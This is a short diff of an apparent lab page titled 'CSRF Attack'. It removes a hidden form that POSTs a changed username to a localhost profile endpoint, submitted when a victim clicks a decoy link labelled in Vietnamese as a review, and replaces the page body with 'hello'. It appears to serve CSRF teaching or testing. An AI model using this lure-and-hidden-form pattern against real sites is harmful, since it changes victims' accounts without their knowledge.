@@ -4,17 +4,6 @@
     <title>CSRF Attack</title>
 </head>
 <body>
-    <form id="csrfForm" action="http://localhost:3000/profile" method="POST" style="display:none;">
-        <input type="text" name="username" value="CSRF Attack">
-        <input type="submit">
-    </form>
-    <a href="#" id="reviewLink">Xem review tại đây</a>
-
-    <script>
-        document.getElementById('reviewLink').addEventListener('click', function(event) {
-            event.preventDefault();
-            document.getElementById('csrfForm').submit();
-        });
-    </script>
+    <h1>hello</h1>
 </body>
 </html>
